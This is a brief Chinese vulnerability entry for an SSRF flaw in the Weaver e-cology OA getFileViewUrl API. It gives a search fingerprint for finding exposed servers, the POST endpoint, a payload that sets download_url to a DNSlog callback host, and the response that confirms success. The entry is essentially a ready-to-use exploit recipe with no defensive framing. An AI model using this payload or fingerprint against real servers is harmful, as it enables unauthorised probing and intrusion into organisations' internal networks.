# 泛微getFileViewUrl接口存在SSRF漏洞

泛微OA ｜ SSRF ｜ —
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1`

**Payload**
```
"file_id": "1000",
"file_name": "c",
"download_url":"http://x.dnslog.cn"
```
- **响应特征**：200 DNSlog回显